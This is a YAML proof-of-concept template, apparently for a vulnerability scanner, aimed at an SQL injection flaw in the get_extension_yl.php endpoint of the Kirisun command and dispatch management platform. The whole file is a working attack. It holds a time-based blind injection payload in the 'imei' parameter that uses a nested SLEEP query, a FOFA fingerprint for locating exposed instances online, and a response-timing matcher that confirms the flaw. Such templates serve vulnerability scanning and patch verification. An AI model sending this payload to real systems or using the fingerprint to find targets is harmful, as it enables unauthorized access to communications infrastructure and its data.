id: poc-yaml-kirisun-get-extension-yl-php-sqli
info:
  name: 福建科立讯通信 指挥调度管理平台 get_extension_yl.php SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 科立讯指挥调度管理平台
  fofa: body="指挥调度管理平台"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /api/client/get_extension_yl.php?imei=1%27%20AND%20(SELECT%207545%20FROM%20(SELECT(SLEEP({{.t1}})))Zjzw)%20AND%20%27czva%27=%27czva&timestamp=1&sign=1
  expression: 'status_code == 200 &&

    contains(body,"user not found") &&

    !contains(body,"<") &&

    duration > t1 &&

    duration < t2

    '
transport: http
